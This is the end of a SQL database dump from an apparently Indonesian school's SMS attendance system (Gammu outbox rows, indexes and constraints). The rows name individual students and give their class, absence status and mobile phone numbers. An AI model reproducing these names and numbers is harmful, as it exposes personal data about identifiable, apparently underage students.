('2019-11-13 04:50:31', '0000-00-00 00:00:00', '2019-11-13 04:50:31', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000640069006E0079006100740061006B0061006E00200041006C007000610020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XII.RPL. Pagi ini tanggal 13-November-2019 dinyatakan Alpa ', 928, 'server', 1, 'SendingOKNoReport', -1, 164, 255, 'Gammu .128.90'),
('2019-11-13 04:50:35', '0000-00-00 00:00:00', '2019-11-13 04:50:35', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E006400610020004A0041004B00410020004B0045005200490053004E00410020006B0065006C006100730020005800490049002E00520050004C002E0020005000610067006900200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D0032003000310039002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '+6282282175994', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda JAKA KERISNA kelas XII.RPL. Pagi ini tanggal 13-November-2019 dinyatakan Hadir ', 927, 'server', 1, 'SendingOKNoReport', -1, 165, 255, 'Gammu .128.90'),
('2019-11-13 04:52:09', '0000-00-00 00:00:00', '2019-11-13 04:52:09', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020007000610067006900200069006E006900200041006C00700061002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya pada pagi ini Alpa  Pada Tanggal 13 November 2019', 929, 'server', 1, 'SendingOKNoReport', -1, 166, 255, 'Gammu .128.90'),
('2019-11-13 04:52:42', '0000-00-00 00:00:00', '2019-11-13 04:52:42', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 931, 'server', 1, 'SendingOKNoReport', -1, 167, 255, 'Gammu .128.90'),
('2019-11-13 04:54:46', '0000-00-00 00:00:00', '2019-11-13 04:54:46', NULL, '0041006E0061006E0064006100200020004B0065006C00610073002000200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020005300690061006E006700200069006E00690020002000200050006100640061002000540061006E006700670061006C0020003000310020004A0061006E007500610072007900200031003900370030', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda  Kelas   Keterangan Absensinya pada Siang ini   Pada Tanggal 01 January 1970', 932, 'server', 1, 'SendingOKNoReport', -1, 168, 255, 'Gammu .128.90'),
('2019-11-13 05:04:20', '0000-00-00 00:00:00', '2019-11-13 05:04:20', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C00730070006100730069003E004E00690073002000530069007300770061003C00730070006100730069003E006B0064005F0077006B007400200031003A007000200032003A0073003C00730070006100730069003E00740061006E006700670061006C0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690029', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen<spasi>Nis Siswa<spasi>kd_wkt 1:p 2:s<spasi>tanggal mengunakan format (tahun-bulan-hari)', 933, 'server', 1, 'SendingOKNoReport', -1, 169, 255, 'Gammu .128.90'),
('2019-11-13 05:05:24', '0000-00-00 00:00:00', '2019-11-13 05:05:24', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020007000610067006900200069006E006900200041006C00700061002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya pada pagi ini Alpa  Pada Tanggal 13 November 2019', 934, 'server', 1, 'SendingOKNoReport', -1, 170, 255, 'Gammu .128.90'),
('2019-11-13 05:26:29', '0000-00-00 00:00:00', '2019-11-13 05:26:29', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020007000610067006900200069006E006900200041006C00700061002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya pada pagi ini Alpa  Pada Tanggal 13 November 2019', 935, 'server', 1, 'SendingOKNoReport', -1, 171, 255, 'Gammu .128.90'),
('2019-11-13 06:36:34', '0000-00-00 00:00:00', '2019-11-13 06:36:34', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C00730070006100730069003E004E00690073002000530069007300770061003C00730070006100730069003E006B0064005F0077006B007400200031003A007000200032003A0073003C00730070006100730069003E00740061006E006700670061006C0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690029', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen<spasi>Nis Siswa<spasi>kd_wkt 1:p 2:s<spasi>tanggal mengunakan format (tahun-bulan-hari)', 936, 'server', 1, 'SendingOKNoReport', -1, 172, 255, 'Gammu .128.90'),
('2019-11-13 07:17:08', '0000-00-00 00:00:00', '2019-11-13 07:17:08', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 937, 'server', 1, 'SendingOKNoReport', -1, 173, 255, 'Gammu .128.90'),
('2019-11-13 08:00:44', '0000-00-00 00:00:00', '2019-11-13 08:00:44', NULL, '0066006F0072006D00610074002000790061006E006700200061006E006400610020006D006100730075006B0061006E002000730061006C00610068002000730069006C00610068006B0061006E00200069006B00750074006900200066006F0072006D0061007400200062006500720069006B00750074003A0041006200730065006E003C00730070006100730069003E004E00690073002000530069007300770061003C00730070006100730069003E006B0064005F0077006B007400200031003A007000200032003A0073003C00730070006100730069003E00740061006E006700670061006C0020006D0065006E00670075006E0061006B0061006E00200066006F0072006D00610074002000280074006100680075006E002D00620075006C0061006E002D00680061007200690029', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'format yang anda masukan salah silahkan ikuti format berikut:Absen<spasi>Nis Siswa<spasi>kd_wkt 1:p 2:s<spasi>tanggal mengunakan format (tahun-bulan-hari)', 938, 'server', 1, 'SendingOKNoReport', -1, 174, 255, 'Gammu .128.90'),
('2019-11-13 08:20:18', '0000-00-00 00:00:00', '2019-11-13 08:20:18', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020006B0065006C006100730020005800490049002E00520050004C002E00200053006F0072006500200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D003200300031003900200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E0020004800610064006900720020', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda IQBAL ALQODRI kelas XII.RPL. Sore ini tanggal 13-November-2019 Absensinya dinyatakan Hadir ', 940, 'server', 1, 'SendingOKNoReport', -1, 175, 255, 'Gammu .128.90'),
('2019-11-13 08:20:21', '0000-00-00 00:00:00', '2019-11-13 08:20:21', NULL, '0053006D006B0020004E002000310020004C00610068006100740020004D0065006E00670069006E0066006F0072006D006100730069006B0061006E00200061006E0061006E006400610020004A0041004B00410020004B0045005200490053004E00410020006B0065006C006100730020005800490049002E00520050004C002E00200053006F0072006500200069006E0069002000740061006E006700670061006C002000310033002D004E006F00760065006D006200650072002D003200300031003900200041006200730065006E00730069006E00790061002000640069006E0079006100740061006B0061006E00200041006C007000610020', '+6282282175994', 'Default_No_Compression', '', '+6281100000', -1, 'Smk N 1 Lahat Menginformasikan ananda JAKA KERISNA kelas XII.RPL. Sore ini tanggal 13-November-2019 Absensinya dinyatakan Alpa ', 939, 'server', 1, 'SendingOKNoReport', -1, 176, 255, 'Gammu .128.90'),
('2019-11-13 08:22:55', '0000-00-00 00:00:00', '2019-11-13 08:22:55', NULL, '0041006E0061006E0064006100200049005100420041004C00200041004C0051004F0044005200490020004B0065006C006100730020005800490049002E00520050004C00200020004B00650074006500720061006E00670061006E00200041006200730065006E00730069006E00790061002000700061006400610020007000610067006900200069006E006900200041006C00700061002000200050006100640061002000540061006E006700670061006C0020003100330020004E006F00760065006D00620065007200200032003000310039', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Ananda IQBAL ALQODRI Kelas XII.RPL  Keterangan Absensinya pada pagi ini Alpa  Pada Tanggal 13 November 2019', 941, 'server', 1, 'SendingOKNoReport', -1, 177, 255, 'Gammu .128.90'),
('2019-11-13 08:23:59', '0000-00-00 00:00:00', '2019-11-13 08:23:59', NULL, '004D00610061006600200061006B00730065007300200064006900200074006F006C0061006B', '+6282282175993', 'Default_No_Compression', '', '+6281100000', -1, 'Maaf akses di tolak', 942, 'server', 1, 'SendingOKNoReport', -1, 178, 255, 'Gammu .128.90');

--
-- Indexes for dumped tables
--

--
-- Indeks untuk tabel `as_absen_siswa`
--
ALTER TABLE `as_absen_siswa`
  ADD PRIMARY KEY (`id_absen_siswa`),
  ADD KEY `id_kelas` (`id_kelas`);

--
-- Indeks untuk tabel `as_guru`
--
ALTER TABLE `as_guru`
  ADD PRIMARY KEY (`id_guru`),
  ADD KEY `id_pelajaran` (`id_pelajaran`);

--
-- Indeks untuk tabel `as_jam_pelajaran`
--
ALTER TABLE `as_jam_pelajaran`
  ADD PRIMARY KEY (`id_jam_pelajaran`);

--
-- Indeks untuk tabel `as_jurusan`
--
ALTER TABLE `as_jurusan`
  ADD PRIMARY KEY (`id_jurusan`);

--
-- Indeks untuk tabel `as_kelas`
--
ALTER TABLE `as_kelas`
  ADD PRIMARY KEY (`id_kelas`);

--
-- Indeks untuk tabel `as_level`
--
ALTER TABLE `as_level`
  ADD PRIMARY KEY (`id_level`);

--
-- Indeks untuk tabel `as_notifikasi`
--
ALTER TABLE `as_notifikasi`
  ADD PRIMARY KEY (`id_notifikasi`);

--
-- Indeks untuk tabel `as_pelajaran`
--
ALTER TABLE `as_pelajaran`
  ADD PRIMARY KEY (`id_pelajaran`);

--
-- Indeks untuk tabel `as_siswa`
--
ALTER TABLE `as_siswa`
  ADD PRIMARY KEY (`id_siswa`),
  ADD KEY `id_kelas` (`id_kelas`);

--
-- Indeks untuk tabel `as_users`
--
ALTER TABLE `as_users`
  ADD PRIMARY KEY (`id_users`),
  ADD KEY `id_level` (`id_level`);

--
-- Indeks untuk tabel `as_wali_kelas`
--
ALTER TABLE `as_wali_kelas`
  ADD PRIMARY KEY (`id_wali_kelas`),
  ADD KEY `id_kelas` (`id_kelas`);

--
-- Indeks untuk tabel `inbox`
--
ALTER TABLE `inbox`
  ADD PRIMARY KEY (`ID`);

--
-- Indeks untuk tabel `outbox`
--
ALTER TABLE `outbox`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `outbox_date` (`SendingDateTime`,`SendingTimeOut`),
  ADD KEY `outbox_sender` (`SenderID`);

--
-- Indeks untuk tabel `outbox_multipart`
--
ALTER TABLE `outbox_multipart`
  ADD PRIMARY KEY (`ID`,`SequencePosition`);

--
-- Indeks untuk tabel `pbk`
--
ALTER TABLE `pbk`
  ADD PRIMARY KEY (`ID`);

--
-- Indeks untuk tabel `pbk_groups`
--
ALTER TABLE `pbk_groups`
  ADD PRIMARY KEY (`ID`);

--
-- Indeks untuk tabel `phones`
--
ALTER TABLE `phones`
  ADD PRIMARY KEY (`IMEI`);

--
-- Indeks untuk tabel `sentitems`
--
ALTER TABLE `sentitems`
  ADD PRIMARY KEY (`ID`,`SequencePosition`),
  ADD KEY `sentitems_date` (`DeliveryDateTime`),
  ADD KEY `sentitems_tpmr` (`TPMR`),
  ADD KEY `sentitems_dest` (`DestinationNumber`),
  ADD KEY `sentitems_sender` (`SenderID`);

--
-- AUTO_INCREMENT untuk tabel yang dibuang
--

--
-- AUTO_INCREMENT untuk tabel `as_absen_siswa`
--
ALTER TABLE `as_absen_siswa`
  MODIFY `id_absen_siswa` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;

--
-- AUTO_INCREMENT untuk tabel `as_guru`
--
ALTER TABLE `as_guru`
  MODIFY `id_guru` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT untuk tabel `as_jam_pelajaran`
--
ALTER TABLE `as_jam_pelajaran`
  MODIFY `id_jam_pelajaran` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT untuk tabel `as_jurusan`
--
ALTER TABLE `as_jurusan`
  MODIFY `id_jurusan` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `as_kelas`
--
ALTER TABLE `as_kelas`
  MODIFY `id_kelas` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT untuk tabel `as_level`
--
ALTER TABLE `as_level`
  MODIFY `id_level` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT untuk tabel `as_notifikasi`
--
ALTER TABLE `as_notifikasi`
  MODIFY `id_notifikasi` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=19;

--
-- AUTO_INCREMENT untuk tabel `as_pelajaran`
--
ALTER TABLE `as_pelajaran`
  MODIFY `id_pelajaran` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT untuk tabel `as_siswa`
--
ALTER TABLE `as_siswa`
  MODIFY `id_siswa` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT untuk tabel `as_users`
--
ALTER TABLE `as_users`
  MODIFY `id_users` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;

--
-- AUTO_INCREMENT untuk tabel `as_wali_kelas`
--
ALTER TABLE `as_wali_kelas`
  MODIFY `id_wali_kelas` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT untuk tabel `inbox`
--
ALTER TABLE `inbox`
  MODIFY `ID` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=289;

--
-- AUTO_INCREMENT untuk tabel `outbox`
--
ALTER TABLE `outbox`
  MODIFY `ID` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=946;

--
-- AUTO_INCREMENT untuk tabel `pbk`
--
ALTER TABLE `pbk`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `pbk_groups`
--
ALTER TABLE `pbk_groups`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT;

--
-- Ketidakleluasaan untuk tabel pelimpahan (Dumped Tables)
--

--
-- Ketidakleluasaan untuk tabel `as_absen_siswa`
--
ALTER TABLE `as_absen_siswa`
  ADD CONSTRAINT `as_absen_siswa_ibfk_2` FOREIGN KEY (`id_kelas`) REFERENCES `as_kelas` (`id_kelas`);

--
-- Ketidakleluasaan untuk tabel `as_users`
--
ALTER TABLE `as_users`
  ADD CONSTRAINT `as_users_ibfk_1` FOREIGN KEY (`id_level`) REFERENCES `as_level` (`id_level`);

--
-- Ketidakleluasaan untuk tabel `as_wali_kelas`
--
ALTER TABLE `as_wali_kelas`
  ADD CONSTRAINT `as_wali_kelas_ibfk_1` FOREIGN KEY (`id_kelas`) REFERENCES `as_kelas` (`id_kelas`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
